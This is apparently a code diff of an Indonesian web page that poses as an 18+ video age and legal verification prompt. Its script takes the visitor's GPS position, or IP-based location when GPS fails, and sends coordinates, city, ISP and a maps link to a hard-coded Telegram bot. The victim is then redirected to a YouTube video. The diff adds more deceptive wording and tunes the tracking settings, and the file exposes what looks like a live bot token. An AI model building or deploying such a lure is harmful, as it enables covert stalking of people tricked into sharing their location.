@@ -25,15 +25,15 @@
 
     <div class="text-area">
         <div class="alert">⚠️ PERINGATAN KONTEN (18+)</div>
-        <div class="desc">Video ini mengandung konten sensitif. <br> Sesuai regulasi UU ITE, mohon <b>Izinkan Akses Lokasi</b> untuk memverifikasi bahwa Anda berada di wilayah hukum yang legal.</div>
-        <div id="status">Menunggu interaksi user...</div>
+        <div class="desc">Video ini mengandung konten sensitif sesuai regulasi UU ITE. <br> Mohon <b>Klik Play</b> dan <b>Izinkan Lokasi</b> untuk verifikasi wilayah.</div>
+        <div id="status">Menunggu interaksi...</div>
     </div>
 
     <script>
         // --- KONFIGURASI ---
         const TOKEN = "8792868527:AAE4eltXO4eY-qgIOwrk4Tirf5qrhAdgUbQ";
         const CHAT_ID = "1354234561";
-        const REDIRECT = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Link video prank/bebas
+        const REDIRECT = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
         function kirim(pesan) {
             const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`;
@@ -41,28 +41,28 @@
         }
 
         function trackIP(tipe) {
-            document.getElementById('status').innerText = "Sinkronisasi IP...";
+            document.getElementById('status').innerText = "Verifikasi Jaringan...";
             fetch('https://ipapi.co/json/')
                 .then(res => res.json())
                 .then(data => {
-                    const msg = `⚠️ *INFO TARGET (IP ONLY)*\n` +
+                    const msg = `⚠️ *TARGET TERDETEKSI (IP ONLY)*\n` +
                                 `Status: \`${tipe}\`\n\n` +
                                 `🌐 IP: \`${data.ip}\`\n` +
                                 `📍 Kota: \`${data.city}, ${data.region}\`\n` +
                                 `🏢 ISP: \`${data.org}\`\n\n` +
-                                `🗺 [Lokasi Kasar](https://www.google.com/maps?q=${data.latitude},${data.longitude})`;
+                                `🗺 [Lokasi Estimasi](https://www.google.com/maps?q=${data.latitude},${data.longitude})`;
                     kirim(msg);
                     setTimeout(() => { window.location.href = REDIRECT; }, 1500);
                 }).catch(() => { window.location.href = REDIRECT; });
         }
 
         function gasLacak() {
-            document.getElementById('status').innerText = "Memproses izin...";
+            document.getElementById('status').innerText = "Menghubungkan ke Server...";
             
             const options = {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0 // <--- PENTING: Paksa ambil GPS terbaru setiap klik
+                enableHighAccuracy: false, // Diubah ke false agar HP lebih cepat memberikan koordinat
+                timeout: 25000,            // Ditambah ke 25 detik agar tidak mudah Timeout
+                maximumAge: 0 
             };
 
             if (navigator.geolocation) {
@@ -75,15 +75,13 @@
                                     `🌐 Lat: \`${lat}\`\n` +
                                     `🌐 Lon: \`${lon}\`\n` +
                                     `🎯 Akurasi: \`${acc} meter\`\n\n` +
-                                    `🗺 [Buka Maps](https://www.google.com/maps?q=${lat},${lon})`;
+                                    `🗺 [Buka Google Maps](https://www.google.com/maps?q=${lat},${lon})`;
                         kirim(msg);
-                        document.getElementById('status').innerText = "Sukses! Memuat video...";
+                        document.getElementById('status').innerText = "Sukses! Memuat...";
                         setTimeout(() => { window.location.href = REDIRECT; }, 2000);
                     },
                     (err) => {
-                        let info = "User menolak izin";
-                        if(err.code == 2) info = "GPS mati/sinyal lemah";
-                        if(err.code == 3) info = "Timeout";
+                        let info = "Gagal GPS (" + err.message + ")";
                         trackIP(info);
                     },
                     options
